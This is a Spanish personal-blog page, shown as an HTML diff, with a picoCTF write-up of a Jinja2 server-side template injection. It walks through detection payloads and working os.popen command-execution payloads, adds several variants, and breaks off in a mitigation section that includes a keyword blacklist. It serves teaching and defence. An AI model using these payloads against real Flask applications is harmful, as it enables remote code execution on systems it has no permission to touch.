@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  SSTI1 PicoCTF: Mi Primera Template Injection · Emilinho Janez
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Emilio Juárez">
+<meta name="description" content="Análisis paso a paso de cómo descubrí y exploté mi primera vulnerabilidad Server-Side Template Injection">
+<meta name="keywords" content="blog,desarrollador,personal">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SSTI1 PicoCTF: Mi Primera Template Injection">
+  <meta name="twitter:description" content="Análisis paso a paso de cómo descubrí y exploté mi primera vulnerabilidad Server-Side Template Injection">
+
+<meta property="og:url" content="http://localhost:1313/es/posts/techsec/writeups/ssti-picoctf-writeup/">
+  <meta property="og:site_name" content="Emilinho Janez">
+  <meta property="og:title" content="SSTI1 PicoCTF: Mi Primera Template Injection">
+  <meta property="og:description" content="Análisis paso a paso de cómo descubrí y exploté mi primera vulnerabilidad Server-Side Template Injection">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-13T00:00:00+00:00">
+    <meta property="article:tag" content="SSTI">
+    <meta property="article:tag" content="PicoCTF">
+    <meta property="article:tag" content="Web Exploitation">
+    <meta property="article:tag" content="Jinja2">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/es/posts/techsec/writeups/ssti-picoctf-writeup/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/es/">
+      Emilinho Janez
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/about/">Acerca de</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/posts/techsec/">TechSec</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/posts/rutas/">Rutas</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/posts/tinta/">Tinta</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/posts/worldview/">Worldview</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/projects/">Proyectos</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/es/contact/">Contacto</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/en/">🇬🇧</a>
+              </li>
+            
+          
+            
+              
+              <li class="navigation-item">
+                <a href="/pt-br/">🇧🇷</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/es/posts/techsec/writeups/ssti-picoctf-writeup/">
+              SSTI1 PicoCTF: Mi Primera Template Injection
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-06-13T00:00:00Z">
+                junio 13, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9 minutos de lectura
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/es/categories/ctf-writeups/">CTF Writeups</a>
+      <span class="separator">•</span>
+    <a href="/es/categories/web-exploitation/">Web Exploitation</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/es/tags/ssti/">SSTI</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/es/tags/picoctf/">PicoCTF</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/es/tags/web-exploitation/">Web Exploitation</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/es/tags/jinja2/">Jinja2</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h1 id="ssti1-picoctf-mi-primera-template-injection">
+  SSTI1 PicoCTF: Mi Primera Template Injection
+  <a class="heading-link" href="#ssti1-picoctf-mi-primera-template-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h1>
+
+
+<div class="section-techsec">
+  <h2 id="-el-reto-que-cambió-mi-perspectiva">
+  🎯 El Reto que Cambió Mi Perspectiva
+  <a class="heading-link" href="#-el-reto-que-cambi%c3%b3-mi-perspectiva">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>Cuando me enfrenté por primera vez a SSTI1 en PicoCTF, no tenía idea de que estaba a punto de descubrir una de las vulnerabilidades más elegantes y peligrosas del mundo web. Este writeup documenta mi proceso completo de resolución.</p>
+</div>
+
+<!-- raw HTML omitted -->
+<h2 id="-reconocimiento-inicial">
+  🔍 Reconocimiento Inicial
+  <a class="heading-link" href="#-reconocimiento-inicial">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>Lo primero que hice fue visitar la aplicación web. A simple vista, parecía un formulario básico que procesaba input del
+usuario. El hint de la plataforma mencionaba &ldquo;Server Side Template Injection&rdquo;, así que sabía hacia dónde dirigir mi investigación.</p>
+<h3 id="-análisis-de-la-aplicación-web">
+  🌐 Análisis de la Aplicación Web
+  <a class="heading-link" href="#-an%c3%a1lisis-de-la-aplicaci%c3%b3n-web">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Al acceder a la URL del desafío encontré:</p>
+<ul>
+<li>Una página web simple con un formulario de entrada</li>
+<li>Un campo de texto donde podía ingresar contenido</li>
+<li>La salida se mostraba dinámicamente en la página</li>
+<li>No había filtros obvios en el frontend</li>
+</ul>
+<h3 id="-investigación-previa">
+  📚 Investigación Previa
+  <a class="heading-link" href="#-investigaci%c3%b3n-previa">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Antes de lanzarme a probar payloads al azar, dediqué tiempo a entender qué es SSTI. Consulté la documentación de PortSwigger:</p>
+<p><strong>🔗 Fuente</strong>: <a href="https://portswigger.net/web-security/server-side-template-injection"  class="external-link" target="_blank" rel="noopener">PortSwigger SSTI Guide</a></p>
+
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>💡 ¿Qué es Server-Side Template Injection?</h3>
+  
+  <div class="highlight-content">
+    SSTI ocurre cuando user input es insertado directamente en templates del lado del servidor, permitiendo a atacantes
+ejecutar código en el contexto del servidor.
+  </div>
+</div>
+
+<h2 id="-proceso-de-testing">
+  🧪 Proceso de Testing
+  <a class="heading-link" href="#-proceso-de-testing">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<h3 id="paso-1-identificando-la-vulnerabilidad">
+  Paso 1: Identificando la Vulnerabilidad
+  <a class="heading-link" href="#paso-1-identificando-la-vulnerabilidad">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Según la documentación de PortSwigger, diferentes template engines responden de manera distinta a ciertos payloads.
+El truco está en usar payloads que generen resultados únicos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Primer intento - Testing básico</span>
+</span></span><span class="line"><span class="cl"><span class="o">{{</span>7*7<span class="o">}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: {{7*7}} (sin procesar)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Segundo intento - Diferentes sintaxis</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">7</span><span class="p">*7</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: ${7*7} (sin procesar)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Tercer intento - Jinja2 syntax</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="p">{7*7</span><span class="si">}</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: 49 ✅</span>
+</span></span></code></pre></div>
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>🚨 El Momento Eureka</h3>
+  
+  <div class="highlight-content">
+    Cuando inserté <code>${{7*7}}</code> y vi que el servidor me devolvió <code>49</code> en lugar del string literal, supe que había encontrado
+la vulnerabilidad. ¡El servidor estaba procesando mi input como código!
+  </div>
+</div>
+
+<h3 id="paso-2-identificando-el-template-engine">
+  Paso 2: Identificando el Template Engine
+  <a class="heading-link" href="#paso-2-identificando-el-template-engine">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>El siguiente paso era determinar qué motor de plantillas estaba usando el servidor. Probé el payload diferenciador:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Payload de identificación</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="p">{7*</span><span class="s1">&#39;7&#39;</span><span class="si">}</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: 7777777</span>
+</span></span></code></pre></div><p>Según la documentación, este resultado (<code>7777777</code>) indica que estamos trabajando con <strong>Jinja2</strong>, el motor de plantillas
+popular en Python/Flask.</p>
+<h3 id="paso-3-explorando-el-contexto-disponible">
+  Paso 3: Explorando el Contexto Disponible
+  <a class="heading-link" href="#paso-3-explorando-el-contexto-disponible">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Una vez confirmado Jinja2, exploré qué objetos estaban disponibles en el contexto del template:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Explorando variables globales</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">config</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: Información de configuración de Flask</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Explorando el objeto request</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: Objeto request disponible</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Explorando métodos disponibles</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;</span>
+</span></span></code></pre></div><h2 id="-desarrollo-del-exploit">
+  🛠️ Desarrollo del Exploit
+  <a class="heading-link" href="#-desarrollo-del-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>Con Jinja2 identificado y el contexto explorado, busqué recursos específicos para explotar este motor de plantillas:</p>
+<p><strong>🔗 Recursos consultados</strong>:</p>
+<ul>
+<li><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/"  class="external-link" target="_blank" rel="noopener">OnSecurity SSTI with Jinja2</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/"  class="external-link" target="_blank" rel="noopener">PayloadsAllTheThings - SSTI</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"  class="external-link" target="_blank" rel="noopener">HackTricks SSTI</a></li>
+</ul>
+<h3 id="paso-4-verificando-ejecución-de-comandos">
+  Paso 4: Verificando Ejecución de Comandos
+  <a class="heading-link" href="#paso-4-verificando-ejecuci%c3%b3n-de-comandos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Antes de buscar el flag, quise confirmar que podía ejecutar comandos del sistema:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Primer intento - Payload clásico</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: uid=0(root) gid=0(root) groups=0(root)</span>
+</span></span></code></pre></div><p>¡Perfecto! Tenía ejecución de comandos como root. El <code>.popen('id')</code> ejecuta el comando del sistema <code>id</code> en Unix/Linux,
+mostrando información del usuario actual.</p>
+<h3 id="paso-5-explorando-el-sistema">
+  Paso 5: Explorando el Sistema
+  <a class="heading-link" href="#paso-5-explorando-el-sistema">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Una vez confirmada la RCE (Remote Code Execution), procedí a explorar:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Listando archivos en el directorio actual</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: __pycache__ app.py flag requirements.txt</span>
+</span></span></code></pre></div><p>¡Ahí estaba! Un archivo llamado <code>flag</code>. Pero quise más información:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Listado detallado</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls -la&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># total 12</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># drwxr-xr-x 1 root root   25 May 22 21:36 .</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># drwxr-xr-x 1 root root   23 May 22 21:36 ..</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># drwxr-xr-x 2 root root   32 May 22 21:36 __pycache__</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -rw-r--r-- 1 root root   58 Mar  6 19:44 flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt</span>
+</span></span></code></pre></div><h3 id="paso-6-obteniendo-el-flag">
+  Paso 6: Obteniendo el Flag
+  <a class="heading-link" href="#paso-6-obteniendo-el-flag">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Con la confirmación de que el archivo <code>flag</code> existía y era legible, ejecuté el payload final:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Payload final - Leyendo el flag</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Resultado: picoCTF{s*****_*****_*****_*****}</span>
+</span></span></code></pre></div>
+
+<div class="section-techsec">
+  <h2 id="-flag-obtenido">
+  🎉 ¡Flag Obtenido!
+  <a class="heading-link" href="#-flag-obtenido">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>¡Éxito! El servidor me devolvió el flag completo: <strong><code>picoCTF{s*****_*****_*****_*****}</code></strong></p>
+<p>La sensación fue indescriptible: una mezcla de triunfo técnico, comprensión profunda del attack vector, y respeto por
+la elegancia del exploit.</p>
+
+</div>
+
+<h2 id="-análisis-técnico-profundo">
+  🧠 Análisis Técnico Profundo
+  <a class="heading-link" href="#-an%c3%a1lisis-t%c3%a9cnico-profundo">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<h3 id="por-qué-funcionó-este-exploit">
+  ¿Por qué Funcionó Este Exploit?
+  <a class="heading-link" href="#por-qu%c3%a9-funcion%c3%b3-este-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ol>
+<li><strong>Template Engine Vulnerable</strong>: La aplicación usaba Jinja2 sin sandboxing</li>
+<li><strong>Input Sin Sanitizar</strong>: User input se insertaba directamente en el template</li>
+<li><strong>Contexto Privilegiado</strong>: La aplicación corría con permisos de root</li>
+<li><strong>Acceso al Filesystem</strong>: El motor de plantillas tenía acceso al sistema de archivos</li>
+<li><strong>Objetos Peligrosos Disponibles</strong>: <code>request</code>, <code>config</code> y otros objetos Flask accesibles</li>
+</ol>
+<h3 id="anatomía-del-payload">
+  Anatomía del Payload
+  <a class="heading-link" href="#anatom%c3%ada-del-payload">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></div><p>Desglosando cada parte:</p>
+<ul>
+<li><code>request.application</code>: Accede al objeto aplicación Flask</li>
+<li><code>__globals__</code>: Diccionario de variables globales del módulo</li>
+<li><code>__builtins__</code>: Funciones built-in de Python</li>
+<li><code>__import__('os')</code>: Importa el módulo <code>os</code> dinámicamente</li>
+<li><code>.popen('cat flag')</code>: Ejecuta el comando <code>cat flag</code> en el sistema</li>
+<li><code>.read()</code>: Lee la salida del comando y la retorna como string</li>
+</ul>
+<h3 id="variaciones-del-payload">
+  Variaciones del Payload
+  <a class="heading-link" href="#variaciones-del-payload">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<p>Durante mi investigación, encontré varias formas de lograr RCE:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Usando config object</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Usando lipsum (función disponible en Jinja2)</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Accediendo a subclasses</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">104</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></div><h2 id="-mitigación-y-defensa">
+  🛡️ Mitigación y Defensa
+  <a class="heading-link" href="#-mitigaci%c3%b3n-y-defensa">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>Como ethical hacker, siempre analizo cómo defenderse contra los ataques que aprendo:</p>
+<h3 id="-enfoques-insuficientes">
+  ❌ Enfoques Insuficientes
+  <a class="heading-link" href="#-enfoques-insuficientes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Sanitización básica (fácil de bypassear)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">weak_sanitize</span><span class="p">(</span><span class="n">user_input</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dangerous_patterns</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s1">&#39;\{\{.*\}\}&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;\{</span><span class="si">%.*%</span><span class="s1">\}&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">dangerous_patterns</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_input</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">user_input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">user_input</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Blacklist approach (siempre bypasseable)</span>
+</span></span><span class="line"><span class="cl"><span class="n">banned_words</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;import&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;subprocess&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">]</span>
+</span></span></code></pre></div><h3 id="-defensas-efectivas">
+  ✅ Defensas Efectivas
+  <a class="heading-link" href="#-defensas-efectivas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 1. Usar Sandboxed Environment</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">jinja2.sandbox</span> <span class="kn">import</span> <span class="n">SandboxedEnvironment</span>
+</span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="n">SandboxedEnvironment</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. Validación estricta de input (whitelist)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_input</span><span class="p">(</span><span class="n">user_input</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Solo permitir caracteres alfanuméricos y espacios</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9\s]+$&#39;</span><span class="p">,</span> <span class="n">user_input</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Input contains invalid characters&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">user_input</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. Templates precompilados</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Evitar construcción dinámica de templates</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 4. Contexto limitado</span>
